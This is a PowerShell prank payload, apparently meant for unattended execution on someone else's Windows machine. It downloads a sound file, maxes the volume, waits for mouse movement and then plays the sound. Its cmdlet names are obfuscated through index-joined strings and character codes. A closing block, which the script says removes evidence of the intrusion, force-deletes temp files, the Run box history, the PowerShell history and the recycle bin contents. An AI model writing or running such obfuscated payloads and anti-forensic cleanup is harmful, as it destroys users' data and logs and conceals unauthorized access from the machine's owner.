############################################################################################################################################################

# Download Sound (When using your own link "dl=0" needs to be changed to "dl=1")
# This is for if you want to host your own instance of this script

$fGSG = "https://github.com/CptCap/pstest/raw/main/WetFart.wav"

iwr $fGSG -O $env:TMP\e.wav

############################################################################################################################################################

# This turns the volume up to max level
$t9QWwJgInGyUdR3rOqMK=[Math]::Ceiling(100/2);$OCD5XE7Sdywr0=& (("9DyAVUh-5Y34ZzctSRNGO7FC8k1KxLsmoMjPEbrIlWgnwpQvfeTH2X6daq0BuiJ")[18,49,44,7,20,37,34,49,14,15] -join '') -ComObject WScript.Shell;for($jco5iug5JTNs5OvT55m9MfT53 = 0;$jco5iug5JTNs5OvT55m9MfT53 -lt $t9QWwJgInGyUdR3rOqMK;$jco5iug5JTNs5OvT55m9MfT53++){$OCD5XE7Sdywr0.SendKeys([char] 175)}

############################################################################################################################################################

# This while loop will constantly check if the mouse has been moved 
# if the mouse has not moved "SCROLLLOCK" will be pressed to prevent screen from turning off
# it will then sleep for the indicated number of seconds and check again

& ([string]::join('', ( (65,100,100,45,84,121,112,101) |%{ ( [char][int] $_)})) | % {$_}) -AssemblyName System.Windows.Forms
$PsGr6wiXJ2L = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $Oj2VmyU8 = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $PsGr6wiXJ2L){
            break
        }
        else {
            $OCD5XE7Sdywr0.SendKeys("{CAPSLOCK}");& (("TmrwItiAD4jo59bWchBLqHC1pkXnVR8egu0sOUf2aJKyGZzQENMF6xSdvP7-lY3")[54,5,40,2,5,59,54,60,31,31,24] -join '') -Seconds $Oj2VmyU8
        }
    }
############################################################################################################################################################

# Play Sound 
$grRCCQI3emSyiPe=& (("9DyAVUh-5Y34ZzctSRNGO7FC8k1KxLsmoMjPEbrIlWgnwpQvfeTH2X6daq0BuiJ")[18,49,44,7,20,37,34,49,14,15] -join '') System.Media.SoundPlayer;$grRCCQI3emSyiPe.SoundLocation="$env:TMP\e.wav";$grRCCQI3emSyiPe.playsync()

############################################################################################################################################################

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

& ([string]::join('', ( (82,101,109,111,118,101,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) (& (("BkW3KhZQl2aEv0DNid5f4zuFnrGLCwm7UgJ8AxSp1syoMe9cPjYtIVHT6qXRbO-")[26,45,51,62,48,38,25,45,10,17,8,16,24,45,61,39,51,16,43,24] -join '')).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue



